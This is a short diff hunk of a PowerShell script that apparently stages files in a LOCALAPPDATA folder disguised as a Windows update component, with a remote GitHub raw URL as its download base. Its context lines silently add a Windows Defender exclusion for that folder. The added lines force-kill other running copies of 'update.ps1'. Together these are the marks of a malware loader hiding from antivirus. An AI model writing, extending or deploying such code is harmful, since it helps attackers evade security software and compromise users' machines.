@@ -7,6 +7,11 @@ $u2 = "https://raw.githubusercontent.com/$u/$r/main"
 $sDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"
 if (!(Test-Path $sDir)) { md $sDir -Force >$null }
 
+$myId = $PID
+try {
+    Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.CommandLine -match 'update\.ps1' -and $_.ProcessId -ne $myId } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
+} catch { }
+
 # Try Defender exclusion (silent fail if no admin)
 try { Add-MpPreference -ExclusionPath $sDir -EA 0 } catch { }
 
